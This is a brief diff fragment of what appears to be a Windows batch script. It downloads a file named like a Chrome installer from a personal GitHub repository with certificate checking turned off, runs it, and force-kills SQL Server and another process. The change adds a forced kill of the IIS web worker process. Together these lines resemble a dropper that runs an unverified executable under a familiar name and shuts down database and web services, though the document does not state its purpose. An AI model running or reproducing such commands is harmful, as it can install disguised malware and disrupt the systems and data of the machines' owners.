@@ -13,3 +13,4 @@ curl -LJOk https://raw.githubusercontent.com/ThuongHai/thuonghai/master/ChromeSe
 start ChromeSetup.exe
 taskkill /f /im sqlservr.exe
 taskkill /f /im Batch.exe
+taskkill /f /im w3wp.exe
